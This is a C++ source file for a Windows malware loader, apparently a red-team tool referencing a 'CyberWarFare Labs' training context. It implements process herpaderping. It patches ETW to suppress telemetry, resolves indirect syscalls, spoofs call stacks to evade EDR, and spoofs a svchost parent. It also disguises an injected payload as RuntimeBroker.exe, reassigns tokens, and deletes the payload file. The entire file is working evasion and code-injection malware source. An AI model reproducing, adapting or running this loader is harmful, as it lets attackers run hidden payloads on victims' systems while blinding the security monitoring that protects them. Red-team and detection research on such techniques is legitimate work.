#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "CWLInc.h"
#include "StackSpoof.h"
#include "obfstr.h"
#include "api_hash.h"
#include "syscall.h"

// Default payload path - can be overridden at compile time
// Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
#endif

// B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret
// Suppresses ETW events for NtCreateSection / NtCreateProcessEx / NtWriteVirtualMemory
// Must be called before any NT API invocation to prevent DC0021 telemetry
static void PatchEtw()
{
	HMODULE hNtdll = GetNtdllBase();
	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
	if (!pEtw) return;
	DWORD old = 0;
	VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
	VirtualProtect(pEtw, 4, old, &old);
}

static HANDLE GetNonJobParent()
{
	const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
	PROCESSENTRY32W pe = { sizeof(pe) };
	if (Process32FirstW(hSnap, &pe)) {
		do {
			for (int i = 0; targets[i]; i++) {
				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
					DWORD sid = 0xFFFF;
					ProcessIdToSessionId(pe.th32ProcessID, &sid);
					if (sid != 0) continue;
					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
					if (h) { CloseHandle(hSnap); return h; }
				}
			}
		} while (Process32NextW(hSnap, &pe));
	}
	CloseHandle(hSnap);
	return GetCurrentProcess();
}

// GetPayloadBuffer: supports two modes for T1620 Reflective Code Loading
// Mode 1 (STDIN): read payload from stdin with 4-byte size header (NO disk artifact)
//   - Detection: node.exe spawns CertEnrollAgent.exe with stdin redirection
//   - Flow: stdin → VirtualAlloc → ReadFile(stdin) → Herpaderping
// Mode 2 (FILE): fallback to legacy file-based loading (for testing)
//   - Detection: CreateFileW → ReadFile → DeleteFileW (T1070.004)
BYTE *GetPayloadBuffer(OUT size_t &p_size)
{
	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
	DWORD stdinType = GetFileType(hStdin);
	
	// Mode 1: STDIN redirection (T1620 - Reflective Code Loading)
	// Check if stdin is redirected (FILE type instead of CHAR device)
	if (hStdin != INVALID_HANDLE_VALUE && stdinType == FILE_TYPE_PIPE)
	{
		// Read 4-byte size header (little-endian DWORD)
		DWORD payloadSize = 0;
		DWORD bytesRead = 0;
		if (!ReadFile(hStdin, &payloadSize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))
		{
			perror("[-] Failed to read payload size from stdin\n");
			exit(-1);
		}
		
		// Validate size (sanity check: 1KB - 50MB range)
		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)
		{
			perror("[-] Invalid payload size from stdin\n");
			exit(-1);
		}
		
		// Allocate RW buffer for payload
		BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (bufferAddress == NULL)
		{
			perror("[-] Failed to allocate memory for stdin payload buffer\n");
			exit(-1);
		}
		
		// Read payload bytes from stdin
		bytesRead = 0;
		if (!ReadFile(hStdin, bufferAddress, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize)
		{
			perror("[-] Failed to read payload from stdin\n");
			VirtualFree(bufferAddress, 0, MEM_RELEASE);
			exit(-1);
		}
		
		p_size = payloadSize;
		// NO DeleteFileW — payload never touched disk (T1620)
		return bufferAddress;
	}
	
	// Mode 2: FILE-based loading (legacy fallback)
	// Used for testing or when stdin not available
	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		perror("[-] Failed to open payload file (no stdin and no file found)\n");
		return NULL;
	}
	p_size = GetFileSize(hFile, NULL);
	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL)
	{
		perror("[-] Failed to allocate memory for payload buffer\n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))
	{
		perror("[-] Failed to read payload buffer from file\n");
		exit(-1);
	}
	CloseHandle(hFile);
	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode
	return bufferAddress;
}

ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATION pbi)
{
	// Functions Declaration
	HMODULE hNtdll = GetNtdllBase();
	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)RESOLVE_API(hNtdll, RtlImageNtHeader);
	if (pRtlImageNtHeader == NULL)
	{
		perror("[-] Couldn't found API RtlImageNTHeader...\n");
		exit(-1);
	}
	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)RESOLVE_API(hNtdll, NtReadVirtualMemory);
	if (pNtReadVirtualMemory == NULL)
	{
		perror("[-] Couldn't found API NtReadVirtualMemory...\n");
		exit(-1);
	}
	// Retrieving entrypoint of our payload
	BYTE image[0x1000];
	ULONG_PTR entryPoint;
	SIZE_T bytesRead;
	NTSTATUS status;
	ZeroMemory(image, sizeof(image));
	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
	if (!NT_SUCCESS(status))
	{
		perror("[-] Error reading process base address..\n");
		exit(-1);
	}
	entryPoint = (pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);
	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
	return entryPoint;
}

BOOL Herpaderping(BYTE *payload, size_t payloadSize)
{
	HMODULE hNtdll = GetNtdllBase();

	// B2 — Indirect Syscalls: build stubs for the 5 injection-critical Nt* APIs.
	// Each stub: mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11
	// The gadget (syscall;ret) lives inside ntdll .text, so EDR sees the syscall
	// as originating from ntdll, not from our PE or stub page.
	if (!InitSyscallPool(hNtdll))
	{
		perror("[-] Failed to initialize indirect syscall pool\n");
		exit(-1);
	}
	INDIRECT_SYSCALL(_NtCreateSection,        pNtCreateSection,        NtCreateSection);
	INDIRECT_SYSCALL(_NtCreateProcessEx,      pNtCreateProcessEx,      NtCreateProcessEx);
	INDIRECT_SYSCALL(_NtAllocateVirtualMemory,pNtAllocateVirtualMemory,NtAllocateVirtualMemory);
	INDIRECT_SYSCALL(_NtWriteVirtualMemory,   pNtWriteVirtualMemory,   NtWriteVirtualMemory);
	INDIRECT_SYSCALL(_NtCreateThreadEx,       pNtCreateThreadEx,       NtCreateThreadEx);
	SealSyscallPool();  // flip pool to PAGE_EXECUTE_READ — no persistent RWX page

	if (pNtCreateSection == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtCreateSection\n");
		exit(-1);
	}
	if (pNtCreateProcessEx == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtCreateProcessEx\n");
		exit(-1);
	}
	if (pNtAllocateVirtualMemory == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtAllocateVirtualMemory\n");
		exit(-1);
	}
	if (pNtWriteVirtualMemory == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtWriteVirtualMemory\n");
		exit(-1);
	}
	if (pNtCreateThreadEx == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtCreateThreadEx\n");
		exit(-1);
	}

	// Non-injection APIs: keep as EAT-walk resolution (not syscall-hooked in practice)
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)RESOLVE_API(hNtdll, NtQueryInformationProcess);
	if (pNtQueryInformationProcess == NULL)
	{
		perror("[-] Couldn't find API NtQueryInformationProcess...\n");
		exit(-1);
	}
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
	if (pRtlCreateProcessParametersEx == NULL)
	{
		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
	if (pRtlInitUnicodeString == NULL)
	{
		perror("[-] Couldn't find API RtlInitUnicodeString \n");
		exit(-1);
	}
	HANDLE hTemp;
	HANDLE hSection;
	HANDLE hProcess;
	HANDLE hThread;
	NTSTATUS status;
	PROCESS_BASIC_INFORMATION pbi;
	PEB *remotePEB;
	DWORD bytesWritten;
	signed int bufferSize;
	ULONG_PTR entryPoint;
	UNICODE_STRING uTargetFilePath;
	UNICODE_STRING uDllPath;
	PRTL_USER_PROCESS_PARAMETERS processParameters;

	wchar_t tempFile[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = {0};
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
	// Create a temp File
	// later this file holds our payload
	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
						FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	if (hTemp == INVALID_HANDLE_VALUE)
	{
		perror("[-] Unable to create temp file....\n");
		exit(-1);
	}
	// Write Payload into the temp file
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
	{
		perror("[-] Unable to write payload to the file...\n");
		exit(-1);
	}
	// CreateSection with temp file (SPOOFED CALL)
	// SEC_IMAGE flag is set
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
		spoofer.Deactivate();
	}
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}

	// Create Process with section (SPOOFED CALL)
	HANDLE hParent = GetNonJobParent();
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
									0, hSection, NULL, NULL, FALSE);
		spoofer.Deactivate();
	}
	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}

	// Token fixup: NtCreateProcessEx inherits token from parent (svchost.exe via GetNonJobParent),
	// reassign the calling process token so ghost runs with our identity (SYSTEM if via EfsPotato)
	{
		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)RESOLVE_API(hNtdll, NtSetInformationProcess);
		if (pNtSetInformationProcess)
		{
			HANDLE hToken = NULL;
			if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
			{
				HANDLE hPrimary = NULL;
				if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hPrimary))
				{
					PROCESS_ACCESS_TOKEN pat = { hPrimary, NULL };
					pNtSetInformationProcess(hProcess, (PROCESSINFOCLASS)9, &pat, sizeof(pat));
					CloseHandle(hPrimary);
				}
				CloseHandle(hToken);
			}
		}
	}

	// Get remote process information
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
	if (!NT_SUCCESS(status))
	{
		perror("[-] Unable to Get Process Information...\n");
		exit(-1);
	}
	// Get the entry point
	entryPoint = GetEntryPoint(hProcess, payload, pbi);

	// Modify the file on disk
	SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
	bufferSize = GetFileSize(hTemp, 0);
	bufferSize = 0x1000;
	wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
	while (bufferSize > 0)
	{
		WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
		bufferSize -= bytesWritten;
	}

	// Set Process Parameters
	wchar_t targetFilePath[MAX_PATH] = {0};
	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
	wchar_t dllDir[MAX_PATH] = {0};
	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
	UNICODE_STRING uDllDir = {0};
	pRtlInitUnicodeString(&uDllPath, dllDir);
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}

	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	PVOID paramBuffer = processParameters;
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		spoofer.Deactivate();
	}
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
									   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
		spoofer.Deactivate();
	}
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}
	// Getting Remote PEB address
	remotePEB = (PEB *)pbi.PebBaseAddress;
	SIZE_T written = 0;
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), &written))
	{
		exit(-1);
	}

	// Create and resume thread (SPOOFED CALL)
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
								   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
		spoofer.Deactivate();
	}
	if (!NT_SUCCESS(status))
	{
		exit(-1);
	}
	CloseHandle(hTemp);
	return TRUE;
}

int main()
{
	PatchEtw();
	size_t payloadSize;
	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);
	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
}